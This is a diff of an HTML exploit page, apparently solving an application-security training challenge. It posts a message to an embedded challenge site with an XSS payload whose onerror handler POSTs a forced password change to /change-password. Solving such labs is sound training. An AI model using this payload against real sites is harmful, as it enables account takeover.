@@ -2,10 +2,12 @@
 <body>
 <iframe id="test" src="https://udg4ubr0.challenge.appsecmaster.net/"></iframe>
 <script>
-	window.postMessage({
-   	 type: "alert",
-  	  content: '<img src=x onerror="fetch(\'/change-password\',{method:\'POST\',headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},body:\'new_password=test\'})">'
-	}, "*");
+  document.getElementById('test').onload = function () {
+    document.getElementById('test').contentWindow.postMessage({
+      type: 'alert',
+      content: '<img src=x onerror="fetch(\'/change-password\',{method:\'POST\',headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'},body:\'new_password=test\'})">'
+    }, '*');
+  };
 </script>
 </body>
 </html>
